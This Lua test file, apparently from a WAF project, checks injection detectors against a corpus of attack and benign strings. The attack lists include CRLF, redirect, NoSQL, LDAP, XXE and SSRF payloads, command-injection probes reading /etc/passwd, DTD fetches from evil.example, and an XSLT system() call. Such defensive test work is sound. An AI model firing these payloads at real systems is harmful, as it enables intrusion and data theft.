-- waf-gap4 detector corpus: crlf / redirect / format / nosql / ldap / upload
-- (scripts/security/waf-detector-corpus.sh runs it after the other two).
-- Values are given URL-decoded, as inspect() sees them. Every attack must be
-- detected by its own detector, every benign value by none of them.
local d = require("cdnca_waf")._detect

local attacks = {
    crlf = {
        "\r\nSet-Cookie: admin=true", "\nLocation: http://evil.example", "\r\nX-Injected: 1",
        "/\r\nLocation: //evil.example", "foo\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK", "\\r\\nSet-Cookie:a=b",
        "\196\138Set-Cookie:a=b", "\229\152\138\229\152\141Set-Cookie:a=b", "%u000d%u000aSet-Cookie:admin=true",
        "\\u000aSet-Cookie:admin=true", "\r\n\r\n<script>alert(1)</script>", "\r\nHTTP/1.1 302 Found",
        "abc\r\nAccess-Control-Allow-Origin: *",
    },
    redirect = {
        "///evil.example", "////evil.example", "/\\evil.example", "\\\\evil.example",
        "/\t/evil.example", "http:3627734734", "http:www.trusted.tld@00330.00072.0000326.00000316", "http:0330.072.0326.0316", "https://trusted.example@evil.example",
        "//trusted.example@evil.example/", "https:/\\evil.example", "http://www.whitelisteddomain.tld@0xd83ad6ce",
    },
    format = {
        "%x%x%x%x", "%s%s%s%s%s", "%p%p%p", "%n%n%n", "AAAA%08x.%08x.%08x.%08x", "%1$s", "%10$n", "%s%p%x%d",
        "%p.%p.%p.%p", "%x %x %x %x",
    },
    nosql = {
        "username[$ne]", "password[$regex]", "login[$gt]", "pass[$nin]",
        '{"username": {"$ne": null}, "password": {"$ne": null}}', '{"user":{"$gt":""}}',
        "' && this.password.match(/.*/)//", "db.users.find({})", "true, $where: '1 == 1'",
        "{ $where: function() { return true } }", "';sleep(5000);", "'; return '' == '",
    },
    ldap = {
        "*)(uid=*))(|(uid=*", "admin)(&(password=*))", "*)(|(objectclass=*))", "(|(mail=*)(cn=*))",
        "admin*)((|userpassword=*)", "x)(|(cn=*)",
    },
    upload = {
        "shell.php", "shell.php.jpg", "avatar.jpg.php", "x.PhP5", "a.phtml", "a.asp;.jpg", "a.aspx", "a.jsp",
        "shell.php%00.jpg", "shell.php\0.jpg", "a.php::$DATA", ".htaccess", "web.config", ".user.ini", "a.php.",
        "a.php ", "dir/../x.phar", "a.cgi",
    },
}

local benign = {
    -- prose and URLs that look close
    "hello world", "50% off today", "save 20%, then 10% more", "100%", "%s items in your cart", "Hello %s, you have %d new",
    "/account/settings", "/en-us/flights-to-united-kingdom", "https://example.com/a?b=1", "//cdn.example.com/a.js",
    "http://example.com/path//double", "user@example.com", "https://user:pw@example.com/", "mailto:a@example.com",
    "javascript tutorial", "C:\\Users\\me\\file.txt", "\\n is a newline in C", "line one\nline two",
    "Dear team,\r\nThanks for the update.\r\nBest", "Subject: hello", "price: 10$", "$ne is a Mongo operator",
    "filter[status]=active", "where[name][$eq]=bob", '{"$schema":"http://json-schema.org/draft-07/schema#"}',
    '{"where":{"price":{"$gt":10}}}', "query Q($where: Input) { items(where: $where) { id } }",
    "(a=b)", "f(x) = (x+1)", "(see notes)", "smile :) (wink)", "a*b", "(cn=Bob)", "count (min=1) (max=5)",
    "photo.jpg", "report.final.pdf", "archive.tar.gz", "my.photo.png", "php-tutorial.pdf", "notes.txt",
    "Content-Type: text/html", "content-encoding: gzip", "https:account.booking.com/register",
    '"content-type: text/plain\\r\\n","content-length: 29\\r\\ncontent-type: application/json\\r\\npragma: no-cache\\r\\n"', "%E4%BD%A0%E5%A5%BD", "%20", "50%25",
}

-- cmd additions (waf-gap4, commix probes as in headers)
local cmd_attacks = { "';echo$IFSRFBYSO$((8+13))$(echo$IFSRFBYSO)RFBYSO'", "||echo NRVZFD$((41+1))$(echo NRVZFD)NRVZFD&",
    "cat${IFS}/etc/passwd", "$((7*7))" }
local cmd_benign = { "$IFS is a shell variable", "total: $(( price ))", "IFSC code SBIN0001", "price $10 (approx)" }

-- xxe (waf-gap4 follow-up: whole XML documents in a header) and ssrf with a name= prefix
local xxe_attacks = {
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/x.dtd"> %xxe;]>',
    '<!DOCTYPE foo SYSTEM "http://evil.example/x.dtd"><foo/>', '<!DOCTYPE foo PUBLIC "-//x" "http://evil.example/x.dtd">',
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:value-of select="php:function(\'system\',\'id\')"/></xsl:stylesheet>',
    '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
}
local xxe_benign = { '<?xml version="1.0" encoding="UTF-8"?><note><to>Tove</to></note>', '<!DOCTYPE html><html></html>',
    '<!DOCTYPE foo [<!ENTITY copy "(c) 2026">]><foo>&copy;</foo>', '<svg xmlns="http://www.w3.org/2000/svg"></svg>',
    "Tom &amp; Jerry", "a < b and c > d" }
local ssrf_extra = { "url=tftp://evil.example:69/x", "u=gopher://127.0.0.1:6379/_x", "next=http://169.254.169.254/latest" }
local ssrf_extra_benign = { "url=https://example.com/a", "q=hello world", "a=b" }

local failures, total = 0, 0
local function expect(name, detector, value, want)
    total = total + 1
    if (detector(value) == true) ~= want then
        failures = failures + 1
        print("FAIL " .. name .. " want=" .. tostring(want) .. " value=" .. value:gsub("[%z\1-\31\127-\255]", "."))
    end
end
local names = { "crlf", "redirect", "format", "nosql", "ldap", "upload" }
for _, name in ipairs(names) do
    for _, value in ipairs(attacks[name]) do expect(name, d[name], value, true) end
    if name ~= "upload" then
        for _, value in ipairs(benign) do expect("benign-" .. name, d[name], value, false) end
    end
end
for _, name in ipairs({ "photo.jpg", "report.final.pdf", "archive.tar.gz", "my.photo.png", "php-tutorial.pdf",
    "notes.txt", "IMG_0001.HEIC", "résumé.docx" }) do
    expect("benign-upload", d.upload, name, false)
end
for _, value in ipairs(xxe_attacks) do expect("xxe", d.xxe, value, true) end
for _, value in ipairs(xxe_benign) do expect("benign-xxe", d.xxe, value, false) end
for _, value in ipairs(benign) do expect("benign-xxe", d.xxe, value, false) end
for _, value in ipairs(ssrf_extra) do expect("ssrf", d.ssrf, value, true) end
for _, value in ipairs(ssrf_extra_benign) do expect("benign-ssrf", d.ssrf, value, false) end
for _, value in ipairs(cmd_attacks) do expect("cmd", d.cmd, value, true) end
for _, value in ipairs(cmd_benign) do expect("benign-cmd", d.cmd, value, false) end
print(string.format("detector corpus gap4: %d checks, %d failures", total, failures))

local sample = string.rep("customer review text with 50% off and (notes) 123, ", 4)
local iterations = 100000
ngx.update_time()
local started = ngx.now()
for _ = 1, iterations do d.crlf(sample) d.redirect(sample) d.format(sample) d.nosql(sample) d.ldap(sample) end
ngx.update_time()
print(string.format("detector speed: %.2f us per 200-byte value (crlf+redirect+format+nosql+ldap)",
    (ngx.now() - started) / iterations * 1e6))
os.exit(failures == 0 and 0 or 1)
